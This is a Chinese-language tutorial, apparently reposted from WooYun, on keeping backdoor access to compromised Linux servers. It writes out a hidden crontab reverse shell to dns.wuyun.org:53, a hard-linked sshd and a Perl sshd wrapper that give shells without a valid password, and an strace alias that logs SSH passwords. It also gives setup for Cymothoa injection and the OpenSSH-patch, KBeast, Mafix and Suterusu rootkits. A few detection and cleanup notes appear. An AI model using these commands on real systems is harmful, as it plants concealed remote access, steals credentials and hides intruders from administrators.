# 原文地址:<http://drops.wooyun.org/tips/15702>

# 0x00 前言

* * *

前一段时间学习一小部分内网的小笔记，<http://zone.wooyun.org/content/26415>

结果没想到好像还是比较受欢迎，也是第一次被劈雷。最近办比赛遇上了rookit种植，感觉很无奈，所以自己也就研究了一下，内容都是一些以前的技术，也是为下面的笔记再次增加一章(windows下的域权限维持可以多看看三好学生师傅的文章)。大牛飘过。

笔记地址：  
<https://github.com/l3m0n/pentest_study>

测试环境:centos 6.5

# 0x01 crontab

* * *

计划任务,永远的爱

每60分钟反弹一次shell给dns.wuyun.org的53端口

    
    
    #!bash
    (crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/dns.wuyun.org/53;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -
    

# 0x02 硬链接sshd

* * *

上了防火墙的坑...测试前关闭一下吧

    
    
    #!bash
    service iptables stop
    

出现：ssh: connect to host 192.168.206.142 port 2333: No route to host

    
    
    #!bash
    ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=2333;
    ssh [[email protected]](/cdn-cgi/l/email-protection) -p 2333
    

用root/bin/ftp/mail当用户名,密码任意

后门排查：

    
    
    #!bash
    netstat -anopt
    

查找有问题的进程

    
    
    #!bash
    ps -ef | grep pid
    ls -al /tmp/su
    kill -9 pid
    rm -rf /tmp/su
    

![p1](http://static.wooyun.org//drops/20160513/201605131044453439219.jpg)

# 0x03 SSH Server wrapper

* * *

条件：开启ssh，如果不连接是没有端口进程的，而且last也看不到

    
    
    #!bash
    cd /usr/sbin
    mv sshd ../bin
    echo '#!/usr/bin/perl' >sshd
    
    echo 'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);' >>sshd
    
    echo 'exec {"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd
    chmod u+x sshd
    //不用重启也行
    /etc/init.d/sshd restart
    

kali下的执行

    
    
    #!bash
    socat STDIO TCP4:192.168.206.142:22,sourceport=13377
    

对于源端口的修改：

    
    
    #!python
    >>> import struct
    >>> buffer = struct.pack('>I6',19526)
    >>> print repr(buffer)
    '\x00\x00LF'
    >>> buffer = struct.pack('>I6',13377)
    >>> print buffer
    4A
    

后门排查：

    
    
    #!bash
    netstat -anopt
    //查看一下sshd进程情况,如果发现不是/usr/sbin/目录下面,就有问题
    ll /proc/1786
    cat /usr/sbin/sshd
    

![p2](http://static.wooyun.org//drops/20160513/201605131044479337221.jpg)

还原：

    
    
    #!bash
    rm -rf /usr/sbin/sshd; mv /usr/bin/sshd ../sbin;
    

# 0x04 SSH keylogger

* * *

vim当前用户下的.bashrc文件,末尾添加

    
    
    #!bash
    alias ssh='strace -o /tmp/sshpwd-`date    '+%d%h%m%s'`.log -e read,write,connect  -s2048 ssh'
    

然后使配置生效

    
    
    #!bash
    source .bashrc
    

当本地su或者ssh的时候,就会在tmp下面记录(无论失败成功都有记录)

![p3](http://static.wooyun.org//drops/20160513/201605131044499854231.jpg)

# 0x05 Cymothoa_进程注入backdoor

* * *

很赞的点是注入到的进程,只要有权限就行,然后反弹的也就是进程相应的权限(并不需要root那样),当然进程重启或者挂了也就没了.当然动作也是很明显的。

线程注入：

    
    
    #!bash
    ./cymothoa -p 2270 -s 1 -y 7777
    

![p4](http://static.wooyun.org//drops/20160513/2016051310450779381121.jpg)

    
    
    #!bash
    nc -vv ip 7777
    

# 0x06openssh_rookit

* * *

下载地址：<http://core.ipsecs.com/rootkit/patch-to-
hack/0x06-openssh-5.9p1.patch.tar.gz>

先patch

    
    
    #!bash
    wget http://mirror.corbina.net/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz
    tar zxvf openssh-5.9p1.tar.gz
    cp sshbd5.5p1.diff openssh-5.9p1/
    cd openssh-5.9p1
    patch < sshbd5.9p1.diff
    

安装依赖

    
    
    #!bash
    yum install zlib-devel
    yum install openssl-devel
    yun install pam-devel
    yun install krb5-lib(没安装)
    

修改includes.h

![p5](http://static.wooyun.org//drops/20160513/201605131044512589441.jpg)

编译安装再重启sshd服务

    
    
    #!bash
    ./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5
    make && make install && service  sshd restart
    

利用：

会记录登入登出的ssh账号密码(错误的也会记录),配置文件中设置的密码,也可以通过ssh然后root登陆。

![p6](http://static.wooyun.org//drops/20160513/201605131044539703051.jpg)

发现：

![p7](http://static.wooyun.org//drops/20160513/201605131044543588561.jpg)

找到可疑sshd并且查看一下last的登陆ip，最后kill他们的进程,清除暂时不知

# 0x07 Kbeast_rootkit

* * *

<http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz>

    
    
    #!bash
    tar -zxvf ipsecs-kbeast-v1.tar.gz
    cd kbeast-v1/
    vi config.h
    

重要配置：

    
    
    #!cpp
    //键盘记录
    #define _LOGFILE_ "acctlog"
    
    //rookit产生的日志配置文件所存储位置(此位置是被隐藏的)
    #define _H4X_PATH_ "/usr/_h4x_"
    
    //telnet端口(端口也是隐藏的,netstat是看不到的)
    #define _HIDE_PORT_ 23333
    
    //telnet的端口以及返回回来的用户名(必须能调用/sh/bash,否则安装会出现Network Daemon错误)
    #define _RPASSWORD_ "lolloltest"
    #define _MAGIC_NAME_ "root"
    

利用：

1、记录：

![p8](http://static.wooyun.org//drops/20160513/201605131044564847871.jpg)

2、telnet连接

![p9](http://static.wooyun.org//drops/20160513/201605131044587547181.jpg)

  * 缺点：重启就会失效,需要放入启动项
  * 优点：相比上面都是需要ssh相关或者是有一个低权限维持才能发挥的一个后门,这个是直接开放一个独立的端口

发现：其实感觉修改一下进程名,发现还是有点麻烦

![p10](http://static.wooyun.org//drops/20160513/201605131044597256491.jpg)

# 0x08 Mafix + Suterusu rookit

* * *

1、Mafix

    
    
    #!bash
    ./root lolloltest 23333
    

这样就会产生一个端口为23333,root密码也可以用lolloltest登陆的ssh,端口不隐藏

![p11](http://static.wooyun.org//drops/20160513/2016051310450125531101.jpg)

这时候就可以用Suterusu配合使用

2、Suterusu

功能表：

    
    
    #!bash
    Get root
    $ ./sock 0
    Hide PID
    $ ./sock 1 [pid]
    Unhide PID
    $ ./sock 2 [pid]
    Hide TCPv4 port
    $ ./sock 3 [port]
    Unhide TCPv4 port
    $ ./sock 4 [port]
    Hide TCPv6 port
    $ ./sock 5 [port]
    Unhide TCPv6 port
    $ ./sock 6 [port]
    Hide UDPv4 port
    $ ./sock 7 [port]
    Unhide UDPv4 port
    $ ./sock 8 [port]
    Hide UDPv6 port
    $ ./sock 9 [port]
    Unhide UDPv6 port
    $ ./sock 10 [port]
    Hide file/directory
    $ ./sock 11 [name]
    Unhide file/directory
    $ ./sock 12 [name]
    

编译：

    
    
    #!bash
    make linux-x86 KDIR=/lib/modules/$(uname -r)/build
    gcc sock.c -o sock
    //加载模块
    insmod suterusu.ko
    

结合Mafix使用(隐藏端口):

    
    
    #!bash
    ./sock 3 [port]
    

![p12](http://static.wooyun.org//drops/20160513/2016051310450532846111.jpg)

# 0x09 参考资料

* * *

  * <https://www.aldeid.com/wiki/Cymothoa>
  * <http://phrack.org/issues/68/9.html>
  * <http://www.joychou.org/index.php/web/ssh-backdoor.html>

